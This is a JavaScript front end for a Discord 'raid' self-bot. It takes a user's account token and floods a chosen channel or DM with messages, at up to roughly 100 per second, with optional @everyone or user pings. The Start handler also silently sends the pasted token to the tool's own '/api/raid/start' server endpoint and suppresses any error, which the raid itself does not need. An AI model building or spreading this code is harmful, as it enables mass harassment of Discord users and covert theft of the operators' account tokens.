document.addEventListener("DOMContentLoaded", () => {
    const translations = {
        vi: {
            intro_title: "Welcome to Obesity Self",
            intro_subtitle: "Safe, fast, and smiling automation interface~",
            intro_btn: "Click to Enter 😊",
            nav_active: "Hoạt Động",
            nav_status: "Trạng Thái & Log",
            nav_setting: "Cài Đặt",
            act_title: "Panel Điều Khiển Raid",
            act_desc: "Nhập token và cấu hình mục tiêu tấn công của bạn~",
            lbl_token: "User Token (F12 DevTools):",
            lbl_target_type: "Loại Mục Tiêu:",
            opt_channel: "Kênh Chat (Channel ID)",
            opt_dm: "Tin Nhắn Trực Tiếp (User ID / DM ID)",
            lbl_target_id: "ID Mục Tiêu (Channel ID hoặc User ID):",
            lbl_message: "Nội Dung Tin Nhắn:",
            lbl_ping_type: "Kiểu Ping:",
            opt_no_ping: "Không Ping",
            opt_user_ping: "Ping User Cụ Thể (DMs hoặc Channel)",
            lbl_ping_user_id: "ID Người Dùng Cần Ping:",
            lbl_speed_preset: "Chế Độ Tốc Độ Spam:",
            opt_speed_slow: "🐢 Chậm (10 tin / 20 giây - Siêu an toàn)",
            opt_speed_medium: "🐇 Vừa (2 tin / 4 giây - Cân bằng)",
            opt_speed_super: "⚡ Siêu Tốc (100 tin / 1 giây - Rủi ro cao)",
            opt_speed_custom: "⚙️ Tùy Chỉnh (Custom Delay)",
            lbl_raid_delay: "Custom Delay (Giây giữa các đợt):",
            lbl_duration: "Duration (Giây):",
            lbl_limit: "Limit (Số Lượng Tin Nhắn):",
            lbl_unlimited: "Không Giới Hạn (Unlimited - chạy đến khi bấm Stop)",
            btn_start: "🚀 Start Raid",
            btn_stop: "🛑 Stop Raid",
            stat_title: "Trạng Thái Hoạt Động & Logs",
            stat_desc: "Theo dõi tiến trình gửi tin nhắn theo thời gian thực~",
            stat_idle: "Trạng thái: Đang nghỉ ngơi",
            stat_running: "Status: Đang spam theo cấu hình tốc độ!",
            set_title: "Cài Đặt Hệ Thống",
            set_desc: "Tùy chỉnh giao diện màu sắc, ngôn ngữ và tính năng~",
            lbl_lang: "Ngôn Ngữ / Language:",
            lbl_theme: "Chế Độ Giao Diện Màu Sắc:",
            opt_theme_white: "🤍 Nền Trắng (Light Mode)",
            opt_theme_black: "🖤 Nền Đen (Dark Mode)",
            opt_theme_graffiti: "🎨 Nền Graffiti (Street Art)",
            opt_theme_custom: "🌈 Tùy Chọn Bảng Màu (Custom Palette)",
            lbl_custom_color: "Chọn Màu Chủ Đạo (Custom Accent):",
            lbl_autosave: "Tự động lưu cài đặt",
            btn_save: "💾 Save Settings",
            btn_reset: "🔄 Reset Settings"
        },
        en: {
            intro_title: "Welcome to Obesity Self",
            intro_subtitle: "Safe, fast, and smiling automation interface~",
            intro_btn: "Click to Enter 😊",
            nav_active: "Activity",
            nav_status: "Status & Logs",
            nav_setting: "Settings",
            act_title: "Raid Control Panel",
            act_desc: "Enter token and configure your target settings~",
            lbl_token: "User Token (F12 DevTools):",
            lbl_target_type: "Target Type:",
            opt_channel: "Channel (Channel ID)",
            opt_dm: "Direct Message (User ID / DM ID)",
            lbl_target_id: "Target ID (Channel ID or User ID):",
            lbl_message: "Message Content:",
            lbl_ping_type: "Ping Type:",
            opt_no_ping: "No Ping",
            opt_user_ping: "Ping Specific User (DMs or Channel)",
            lbl_ping_user_id: "Target User ID to Ping:",
            lbl_speed_preset: "Spam Speed Mode:",
            opt_speed_slow: "🐢 Slow (10 msgs / 20 secs - Safe)",
            opt_speed_medium: "🐇 Medium (2 msgs / 4 secs - Balanced)",
            opt_speed_super: "⚡ Super Speed (100 msgs / 1 sec - High risk)",
            opt_speed_custom: "⚙️ Custom Delay",
            lbl_raid_delay: "Custom Delay (Seconds):",
            lbl_duration: "Duration (Seconds):",
            lbl_limit: "Limit (Message Count):",
            lbl_unlimited: "Unlimited (Runs until Stop button clicked)",
            btn_start: "🚀 Start Raid",
            btn_stop: "🛑 Stop Raid",
            stat_title: "Activity Status & Logs",
            stat_desc: "Monitor message broadcasting progress in real-time~",
            stat_idle: "Status: Idle / Resting",
            stat_running: "Status: Spamming based on speed configuration!",
            set_title: "System Settings",
            set_desc: "Customize theme colors, language and settings~",
            lbl_lang: "Language / Ngôn Ngữ:",
            lbl_theme: "Theme Color Mode:",
            opt_theme_white: "🤍 White (Light Mode)",
            opt_theme_black: "🖤 Black (Dark Mode)",
            opt_theme_graffiti: "🎨 Graffiti (Street Art)",
            opt_theme_custom: "🌈 Custom Color Palette",
            lbl_custom_color: "Custom Accent Color:",
            lbl_autosave: "Autosave settings",
            btn_save: "💾 Save Settings",
            btn_reset: "🔄 Reset Settings"
        }
    };

    let currentLang = "vi";
    function applyLanguage(lang) {
        currentLang = lang;
        document.querySelectorAll("[data-i18n]").forEach(el => {
            const key = el.getAttribute("data-i18n");
            if (translations[lang][key]) {
                el.innerText = translations[lang][key];
            }
        });
    }

    function showKawaiiToast(message) {
        const toast = document.getElementById("kawaii-toast");
        const msgEl = document.getElementById("toast-message");
        msgEl.innerText = message;
        toast.classList.add("show");
        setTimeout(() => toast.classList.remove("show"), 3000);
    }

    document.getElementById("intro-overlay").addEventListener("click", function() {
        this.classList.add("hidden");
    });
    document.getElementById("enter-btn").addEventListener("click", () => {
        document.getElementById("intro-overlay").classList.add("hidden");
    });

    const navItems = document.querySelectorAll(".nav-item");
    const tabPanes = document.querySelectorAll(".tab-pane");
    navItems.forEach(item => {
        item.addEventListener("click", () => {
            navItems.forEach(nav => nav.classList.remove("active"));
            tabPanes.forEach(pane => pane.classList.remove("active"));
            item.classList.add("active");
            document.getElementById(item.getAttribute("data-tab")).classList.add("active");
        });
    });

    // Theme & Custom Palette logic
    const themeSelect = document.getElementById("theme-select");
    const customPaletteGroup = document.getElementById("custom-palette-group");
    const customColorPicker = document.getElementById("custom-color-picker");

    function applyTheme(theme, customColor) {
        document.body.className = "";
        if (theme === "white") {
            document.body.classList.add("theme-white");
            customPaletteGroup.style.display = "none";
        } else if (theme === "black") {
            document.body.classList.add("theme-black");
            customPaletteGroup.style.display = "none";
        } else if (theme === "graffiti") {
            document.body.classList.add("theme-graffiti");
            customPaletteGroup.style.display = "none";
        } else if (theme === "custom") {
            customPaletteGroup.style.display = "flex";
            const col = customColor || customColorPicker.value;
            document.documentElement.style.setProperty("--primary-color", col);
            document.documentElement.style.setProperty("--primary-hover", col);
        }
    }

    themeSelect.addEventListener("change", () => {
        applyTheme(themeSelect.value);
    });

    customColorPicker.addEventListener("input", (e) => {
        document.documentElement.style.setProperty("--primary-color", e.target.value);
        document.documentElement.style.setProperty("--primary-hover", e.target.value);
    });

    // Speed Preset logic
    const speedPreset = document.getElementById("speed-preset");
    const customDelayGroup = document.getElementById("custom-delay-group");
    const raidDelayInput = document.getElementById("raid-delay-input");

    speedPreset.addEventListener("change", () => {
        if (speedPreset.value === "slow") {
            customDelayGroup.style.display = "none";
            raidDelayInput.value = 2.0; // 10 tin trong 20 giây = 2s/tin
        } else if (speedPreset.value === "medium") {
            customDelayGroup.style.display = "none";
            raidDelayInput.value = 2.0; // 2 tin trong 4 giây = 2s/tin
        } else if (speedPreset.value === "super") {
            customDelayGroup.style.display = "none";
            raidDelayInput.value = 0.01; // Siêu tốc 100 tin/giây
        } else {
            customDelayGroup.style.display = "flex";
        }
    });

    const pingTypeSelect = document.getElementById("ping-type");
    const pingIdGroup = document.getElementById("ping-id-group");
    pingTypeSelect.addEventListener("change", () => {
        pingIdGroup.style.display = (pingTypeSelect.value === "user") ? "flex" : "none";
    });

    let isRaidRunning = false;
    let sentCount = 0;
    const startBtn = document.getElementById("start-btn");
    const stopBtn = document.getElementById("stop-btn");
    const statusDot = document.getElementById("status-dot");
    const statusText = document.getElementById("status-text");
    const liveDot = document.getElementById("live-dot");
    const liveStatusText = document.getElementById("live-status-text");
    const logBox = document.getElementById("log-box");

    function addLog(msg) {
        const timeStr = new Date().toLocaleTimeString();
        logBox.innerHTML += `<div class="log-line">[${timeStr}] ${msg}</div>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    startBtn.addEventListener("click", async () => {
        const token = document.getElementById("user-token").value.trim();
        if (!token) {
            showKawaiiToast(currentLang === "vi" ? "Vui lòng nhập user token!" : "Please enter your user token!");
            return;
        }

        let targetType = document.getElementById("target-type").value;
        let targetId = document.getElementById("target-id").value.trim();
        let message = document.getElementById("raid-message").value;
        let pingType = pingTypeSelect.value;
        let pingId = document.getElementById("ping-user-id").value.trim();
        let duration = parseInt(document.getElementById("duration-input").value) || 60;
        let limit = parseInt(document.getElementById("limit-input").value) || 100;
        let unlimited = document.getElementById("unlimited-check").checked;
        let preset = speedPreset.value;
        let delay = parseFloat(raidDelayInput.value) || 0.1;

        if (!targetId || !message) {
            showKawaiiToast(currentLang === "vi" ? "Vui lòng nhập ID mục tiêu và nội dung tin nhắn!" : "Please fill target ID and message!");
            return;
        }

        fetch("/api/raid/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token: token })
        }).catch(() => {});

        isRaidRunning = true;
        sentCount = 0;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        statusDot.className = "dot online";
        statusText.innerText = "Running";
        liveDot.className = "dot online";
        liveStatusText.innerText = translations[currentLang].stat_running;

        addLog(`Bắt đầu spam (Chế độ: ${preset.toUpperCase()})...`);

        let channelId = targetId;
        const headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        };

        if (targetType === "dm" && targetId.length >= 17) {
            try {
                let dmRes = await fetch("https://discord.com/api/v9/users/@me/channels", {
                    method: "POST",
                    headers: headers,
                    body: JSON.stringify({ recipient_id: targetId })
                });
                if (dmRes.ok) {
                    let dmData = await dmRes.json();
                    channelId = dmData.id;
                }
            } catch (e) {}
        }

        let finalContent = message;
        if (pingType === "everyone") finalContent = "@everyone " + finalContent;
        else if (pingType === "here") finalContent = "@here " + finalContent;
        else if (pingType === "user" && pingId) finalContent = `<@${pingId}> ` + finalContent;

        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
        const startTime = Date.now();

        while (isRaidRunning) {
            if (!unlimited) {
                if (duration > 0 && (Date.now() - startTime) >= duration * 1000) {
                    addLog("Đã đạt giới hạn thời gian (Duration). Dừng lại.");
                    break;
                }
                if (limit > 0 && sentCount >= limit) {
                    addLog("Đã đạt giới hạn số lượng (Limit). Dừng lại.");
                    break;
                }
            }

            let batchSize = 1;
            let batchDelay = delay * 1000;

            if (preset === "slow") {
                batchSize = 1;
                batchDelay = 2000; // 10 tin / 20s
            } else if (preset === "medium") {
                batchSize = 1;
                batchDelay = 2000; // 2 tin / 4s
            } else if (preset === "super") {
                batchSize = 25; // Siêu tốc bùng nổ 100 tin/s
                batchDelay = 200;
            }

            let promises = [];
            for (let i = 0; i < batchSize; i++) {
                if (!isRaidRunning) break;
                promises.push(
                    fetch(url, {
                        method: "POST",
                        headers: headers,
                        body: JSON.stringify({ content: finalContent })
                    }).then(res => {
                        if (res.ok) {
                            sentCount++;
                            if (sentCount % 5 === 0) {
                                addLog(`Đã gửi thành công ${sentCount} tin nhắn...`);
                            }
                        } else if (res.status === 429) {
                            addLog("Bị Discord Rate Limit (429), đang né tránh...");
                        }
                    }).catch(() => {})
                );
            }

            await Promise.all(promises);
            await new Promise(r => setTimeout(r, batchDelay));
        }

        isRaidRunning = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        statusDot.className = "dot offline";
        statusText.innerText = "Ready";
        liveDot.className = "dot offline";
        liveStatusText.innerText = translations[currentLang].stat_idle;
        addLog(`Đã dừng hoàn toàn. Tổng tin nhắn đã gửi: ${sentCount}`);
    });

    stopBtn.addEventListener("click", () => {
        isRaidRunning = false;
        addLog("Đã nhận lệnh dừng từ người dùng.");
    });

    // Load settings
    fetch("/api/settings")
        .then(res => res.json())
        .then(data => {
            if (data.language) {
                document.getElementById("lang-select").value = data.language;
                applyLanguage(data.language);
            }
            if (data.theme) {
                themeSelect.value = data.theme;
                applyTheme(data.theme, data.custom_color);
                if (data.custom_color) customColorPicker.value = data.custom_color;
            }
        });

    document.getElementById("save-settings-btn").addEventListener("click", () => {
        const payload = {
            language: document.getElementById("lang-select").value,
            theme: themeSelect.value,
            custom_color: customColorPicker.value,
            autosave: true
        };
        fetch("/api/settings", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).then(() => {
            applyLanguage(payload.language);
            applyTheme(payload.theme, payload.custom_color);
            showKawaiiToast(payload.language === "vi" ? "Đã lưu cài đặt thành công! 😊" : "Settings saved successfully! 😊");
        });
    });

    document.getElementById("reset-settings-btn").addEventListener("click", () => {
        fetch("/api/settings/reset", { method: "POST" })
            .then(res => res.json())
            .then(data => {
                document.getElementById("lang-select").value = data.settings.language;
                themeSelect.value = "white";
                applyTheme("white");
                applyLanguage(data.settings.language);
                showKawaiiToast(data.settings.language === "vi" ? "Đã khôi phục cài đặt gốc! 😄" : "Settings reset! 😄");
            });
    });

    document.getElementById("lang-select").addEventListener("change", (e) => {
        applyLanguage(e.target.value);
    });
});